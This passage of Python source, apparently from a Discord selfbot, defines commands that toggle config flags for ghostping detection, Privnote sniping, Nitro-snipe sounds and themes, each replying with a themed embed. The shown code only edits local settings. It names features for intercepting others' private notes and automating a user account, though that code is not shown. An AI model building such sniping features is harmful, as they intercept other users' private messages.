                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Detecting relationship updates `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['relationship_detection'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['relationship_detection'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Relationship Detection', description='Detecting relationship updates `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Detecting relationship updates `disabled`'
                await ctx.send(msg)
                
        set_vars()
        
    # @React.command()
    # async def embedmode(ctx):
        
    #     if True == False:
    #         with open("config.json", "r", encoding="utf-8") as jsonFile:
    #             data = json.load(jsonFile)
                
    #         data['embed_mode'] = True
    #         embed_mode = True
            
    #         with open("config.json", "w", encoding="utf-8") as jsonFile:
    #             json.dump(data, jsonFile, indent=4, sort_keys=False)
            
    #         if True:
    #             embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Embed Mode', description='Embed Mode `enabled`',timestamp=embed_timestamp())
    #             embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
    #             embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #             embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #             await embed_or_codeblock(ctx, embed)


    #         else:
    #             msg = 'Embed Mode `enabled`'
    #             await ctx.send(msg)
                
    #     elif True == True:
    #         with open("config.json", "r", encoding="utf-8") as jsonFile:
    #             data = json.load(jsonFile)
                
    #         data['embed_mode'] = False
    #         embed_mode = False
            
    #         with open("config.json", "w", encoding="utf-8") as jsonFile:
    #             json.dump(data, jsonFile, indent=4, sort_keys=False)
            
    #         if True:
    #             embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Embed Mode', description='Embed Mode `disabled`',timestamp=embed_timestamp())
    #             embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
    #             embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #             embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #             await embed_or_codeblock(ctx, embed)


    #         else:
    #             msg = 'Embed Mode `disabled`'
    #             await ctx.send(msg)
                
    #     set_vars()
        
    @React.command(aliases=['gpingdetection'], usage="ghostpingdetection", description="Toggles ghostping detection")
    async def ghostpingdetection(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['ghostping_detection'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ghostping_detection'] = True
            ghostping_detection = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ghostping Detection', description='Detecting Ghostpings `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Detecting Ghostpings `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['ghostping_detection'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['ghostping_detection'] = False
            ghostping_detection = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ghostping Detection', description='Detecting Gostpings `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Detecting Ghostpings `disabled`'
                await ctx.send(msg)
                
        set_vars()
    
    @React.command(aliases=['psniper'], usage="privnotesniper", description="Toggles Privnote sniping")
    async def privnotesniper(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['privnote_sniper'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['privnote_sniper'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Privnote Sniper', description='Sniping Privnotes `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Sniping Privnotes `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['privnote_sniper'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['privnote_sniper'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Privnote Sniper', description='Sniping Privnotes `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Sniping Privnotes `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="snickname", description="Toggles Nickname updates detection sound notifications")
    async def snickname(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['nickname_update_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nickname_update_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nickname updates Sound Notifications', description='Nickname updates sound notifications `enabled`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

                
        elif json.load(open('config.json', encoding='utf-8'))['nickname_update_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nickname_update_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nickname updates Sound Notifications', description='Nickname updates sound notifications `disabled`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
                
        set_vars()

    @React.command(usage="snsnipe", description="Toggles successfull Nitro snipe sound notifications")
    async def snsnipe(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['nitro_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nitro_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nitro Sound Notifications', description='Nitro snipe sound notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Nitro snipe sound notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['nitro_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['nitro_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Nitro Sound Notifications', description='Nitro snipe sound notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Nitro snipe sound notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="sgwin", description="Toggles giveaway win sound notifications")
    async def sgwin(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['giveaway_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Sound Notifications', description='Giveaway win sound notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Giveaway win sound notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['giveaway_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['giveaway_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Giveaway Sound Notifications', description='Giveaway win sound notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Giveaway win sound notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="sprivnotes", description="Toggles Privnotes snipe sound notifications")
    async def sprivnotes(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['privnote_sound'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['privnote_sound'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Privnote Sound Notifications', description='Giveaway sound notifications `enabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Privnote sound notifications `enabled`'
                await ctx.send(msg)
                
        elif json.load(open('config.json', encoding='utf-8'))['privnote_sound'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['privnote_sound'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Privnote Sound Notifications', description='Privnote sound notifications `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Privnote sound notifications `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="themeshuffle", description="Toggle theme shuffle")
    async def themeshuffle(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['theme_shuffle'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['theme_shuffle'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Theme Shuffle', description='Theme shuffling `enabled`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

                
        elif json.load(open('config.json', encoding='utf-8'))['theme_shuffle'] == True:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['theme_shuffle'] = False
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Theme Shuffle', description='Theme shuffling `disabled`',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Theme shuffle `disabled`'
                await ctx.send(msg)
                
        set_vars()

    @React.command(usage="switchmode", description="Switch to Codeblock/Embed mode")
    async def switchmode(ctx):
        
        if json.load(open('config.json', encoding='utf-8'))['embed_mode'] == False:
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['embed_mode'] = True
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

